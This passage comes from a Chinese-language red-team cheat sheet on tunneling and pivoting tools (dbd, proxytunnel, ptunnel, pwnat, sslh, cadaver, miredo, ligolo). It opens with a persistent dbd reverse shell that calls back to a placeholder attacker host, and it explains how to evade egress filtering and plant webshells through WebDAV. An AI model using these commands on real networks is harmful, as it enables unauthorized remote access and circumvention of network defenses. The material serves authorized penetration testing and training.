# 官网示例:目标端(客户端)每 2400 秒重连、后台运行、执行 bash、回连攻击端 8080
dbd -r 2400 -D on -v -e /bin/bash <attacker-ip> 8080
# 攻击端(服务端)监听 8080
dbd -l -p8080 -v
```

**实战要点**:
- `-D on` 后台化 + `-r <sec>` 周期重连 = 简陋持久化;正式红队需更隐蔽方案,此用法更适合短期会话保活。
- `-p` 紧贴端口(`-p8080`)与空格写法(`-p 8080`)都接受。

### proxytunnel — 让 SSH(等 TCP)穿过 HTTP(S) 代理

**用途**:通过标准 HTTP/HTTPS 代理的 CONNECT 建隧道,把任意 TCP(最典型 SSH)从只放 HTTP 出网的办公网带出去。
**安装**:`sudo apt install proxytunnel`
**使用场景**:内网只有 HTTP 代理(3128/8080)可出网,需要 SSH 直连外网跳板时。

```bash
# 一次性:经代理打通到目标 22,并在本地 2222 开入口
proxytunnel -p <proxy-ip>:3128 -d <target-ip>:22 -a 2222
ssh -p 2222 <user>@localhost

# 配合 ProxyCommand(推荐,一条 SSH 直接走代理)
ssh -o ProxyCommand="proxytunnel -p <proxy-ip>:3128 -d %h:%p" <user>@<target-ip>

# 代理需要认证时
proxytunnel -p <proxy-ip>:3128 -P <proxy-user>:<proxy-pass> -d <target-ip>:22 -a 2222
```

**实战要点**:
- `-p` 是代理地址,`-d` 是最终目标,别写反;`%h:%p` 由 ssh 自动填充目标主机端口。
- CONNECT 通常只放 443;目标 SSH 在非 443 端口会被代理拒,可让目标侧用 sslh 把 SSH 复用到 443。
- 只解决"出代理"这一跳;之后仍可与 chisel/ligolo 叠加。

### ptunnel — TCP over ICMP(仅 ping 出网时的最后手段)

**用途**:把 TCP 连接封装进 ICMP echo request/reply 穿透只允许 ping 的网络。
**安装**:`sudo apt install ptunnel`
**使用场景**:TCP/UDP/DNS 全封、仅 ICMP 放行(如某些工控/隔离网)时。

```bash
# 服务端(能双向 ICMP 的跳板机)
sudo ptunnel
# 客户端(受限网络内):本地 8000 → 经跳板 → 目标 22
sudo ptunnel -p <jump-ip> -lp 8000 -da <target-ip> -dp 22
ssh -p 8000 <user>@localhost
```

**实战要点**:
- `-p` 跳板(ICMP 服务端),`-lp` 本地监听端口,`-da/-dp` 最终目的地址端口。
- 两侧都要 root(raw socket);吞吐低、延迟高,只用于建立第一跳再叠 SSH 隧道。
- 对抗环境下 ICMP 载荷大小异常是明显特征,授权测试中用作监控验证。

### pwnat — NAT-to-NAT 直连(无需端口转发/DMZ)

**用途**:双方都在 NAT 后、无任何端口转发时,借 ICMP 让客户端与服务器建立 UDP 通路,再承载 TCP 代理。
**安装**:`sudo apt install pwnat`
**使用场景**:拿不到公网监听端口(攻击机也在 NAT 后)、目标与攻击机都要互相"看不见"地直连。

```bash
# 官网示例:服务端(公网侧)server 模式监听 8080
pwnat -s 8080
# 客户端(NAT 后):本地 8000 → 经服务端 8080 → google.com:80
pwnat -c 8000 <server-ip> 8080 google.com 80

# 实战:把目标内网 SSH 引到本地
pwnat -c 2222 <server-ip> 8080 <internal-ip> 22
ssh -p 2222 <user>@localhost
```

**实战要点**:
- 服务端无需预知客户端地址,客户端连接经服务端转发到第四个参数指定的真实目标。
- 有公网 VPS 时优先 chisel/ligolo;pwnat 是"两侧都 NAT"特殊场景的解。

### sslh — 协议复用器(443 端口同时当 SSH 和 HTTPS)

**用途**:按首包特征自动识别 SSH/TLS/OpenVPN/tinc/XMPP 并分流到不同后端,让受限网络(只放 443)仍能 SSH 接入。
**安装**:`sudo apt install sslh`
**使用场景**:出网策略只允许 443,但需要 SSH/OpenVPN 接入同一台服务器时。

```bash
# 前台运行:443 上同时服务 SSH 与 TLS
sudo sslh -f -p 0.0.0.0:443 --ssh 127.0.0.1:22 --tls 127.0.0.1:8443
# 还可加:--openvpn <ip>:1194 --tinc ... --xmpp ...

# 常驻:改 /etc/default/sslh 后
sudo systemctl restart sslh
```

**实战要点**:
- 让真实 HTTPS 服务退守 8443 等内部端口,把 443 交给 sslh;SSH 客户端照常 `ssh -p 443 <ip>`。
- 与 proxytunnel 组合:内网只放 CONNECT 443 → proxytunnel 到 sslh → 分流进 SSH。
- 探测它:`nmap -sV -p 443` 会显示多协议特征,蓝队可据此发现端口复用。

### cadaver — 命令行 WebDAV 客户端(交互式)

**用途**:类 ftp 的 WebDAV 客户端:上传/下载/在线编辑、移动复制、集合(目录)增删、属性操作与资源锁定。
**安装**:`sudo apt install cadaver`
**使用场景**:目标开 WebDAV(IIS/SharePoint/Nextcloud 等)且需要命令行批量操作或验证 PUT 权限时。

```bash
# 连接目标 WebDAV
cadaver http://<target-ip>/webdav/
# 交互命令(类 ftp):ls cd get put delete copy move mkcol lock unlock edit
dav:/webdav/> put <file>
dav:/webdav/> get <remote-file>
dav:/webdav/> mkcol testdir
```

**实战要点**:
- PUT/MOVE 成功即意味着可能上传 webshell(结合扩展名/解析漏洞),是 WebDAV 测评核心判定点。
- 需要认证的站点在连接时按提示输入,或在 URL 用 `cadaver http://<user>:<pass>@<target>/dav/`。
- 目标侧自建 WebDAV 用 goshs `-w`;cadaver 与之互为两端。

### miredo — Teredo IPv6 隧道客户端(NAT 后获得 IPv6 出口)

**用途**:实现 Teredo(RFC 4380)客户端,把 IPv6 封装进 UDP/IPv4,给 NAT 后主机提供 IPv6 连通性;也可做 Teredo 中继。
**安装**:`sudo apt install miredo`
**使用场景**:目标/内网只顾着过滤 IPv4,IPv6 出口成漏网通道时的连通与验证。

```bash
# 启动客户端(创建 teredo 接口)
sudo miredo
ip -6 addr show teredo      # 确认拿到 2001:0::/32 的 Teredo 地址
ping6 -c 3 <ipv6-target>
```

**实战要点**:
- 给目标机开 IPv6 出口后,可再叠 chisel/ligolo 的 IPv6 监听,规避只盯 IPv4 的 ACL。
- 配置在 `/etc/miredo/miredo.conf`(默认用公共 Teredo 服务器);无外网依赖场景改 `miredo-server` 包自建服务器。

## 其余工具速查

| 工具 | 一句话用途 | 安装包 | 最常用命令 |
|---|---|---|---|
| chisel-common-binaries | chisel 多平台预编译二进制(含 Windows .exe) | `chisel-common-binaries` | `dpkg -L chisel-common-binaries`(定位 exe 后传目标执行) |
| ligolo-agent | ligolo-ng 目标端(回连 proxy) | `ligolo-ng` | `sudo ligolo-agent -connect <ip>:11601 -ignore-cert -retry` |
| ligolo-proxy | ligolo-ng 攻击端(交互控制台) | `ligolo-ng` | `sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601` |
| ligolo-ng-common-binaries | ligolo 多平台预编译 agent/proxy | `ligolo-ng-common-binaries` | `dpkg -L ligolo-ng-common-binaries` |
| ligolo-mp-client | ligolo-mp 多人协作客户端 | `ligolo-mp` | `ligolo-mp-client` |
| dns2tcpd | dns2tcp 服务端(DNS 侧) | `dns2tcp` | `sudo dns2tcpd -f .dns2tcpdrc` |
| dns2tcpc | dns2tcp 客户端(目标侧,免 root) | `dns2tcp` | `dns2tcpc -f .dns2tcprc` |
| iodine-client-start | 配置化自动拉起 iodine 客户端隧道的辅助脚本 | `iodine` | `iodine-client-start` |
| raven | 自包含 HTTP 文件"上传接收"服务器(补 http.server 只能下载) | `raven` | `raven 0.0.0.0 8080` |
| udptunnel | 把 UDP 封装进 TCP 隧道(仅 TCP 出站环境跑 UDP 业务) | `udptunnel` | `udptunnel -s <port>`(服务端)/ `udptunnel <port> <ip> <port>`(客户端) |
| minicom | 串口终端(硬件/嵌入式 pivot 时的串口控制台) | `minicom` | `sudo minicom -D /dev/ttyUSB0 -b 115200` |
| miredo-server | Teredo 服务器(自建打洞/中继) | `miredo-server` | `sudo miredo-server` |

---

本文件仅用于已获得书面授权的渗透测试、CTF 竞赛与安全教育场景。
